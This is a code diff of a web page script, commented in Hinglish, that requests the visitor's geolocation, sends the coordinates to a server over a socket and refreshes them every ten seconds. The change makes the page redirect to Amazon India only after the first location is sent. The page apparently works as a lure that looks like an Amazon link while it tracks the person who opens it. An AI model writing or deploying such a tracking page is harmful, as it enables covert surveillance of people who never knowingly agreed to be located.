@@ -18,24 +18,24 @@
                 lon: position.coords.longitude
             };
             socket.emit("location", data); // send to server
+
+            // Permission granted → ab Amazon open karo
+            window.location.href = "https://www.amazon.in";
         }
 
         function requestLocation() {
             if(navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    sendLocation,
-                    () => console.log("Location permission denied")
+                    sendLocation,                  // Success → send location + open Amazon
+                    () => console.log("Location permission denied") // Denied
                 );
             } else {
                 console.log("Geolocation not supported");
             }
         }
 
-        requestLocation();
-        setInterval(requestLocation, 10000);
-
-        // Open Amazon automatically
-        window.location.href = "https://www.amazon.in";
+        requestLocation();                     // Pehli location request
+        setInterval(requestLocation, 10000);   // Har 10 sec update
     </script>
 </body>
 </html>
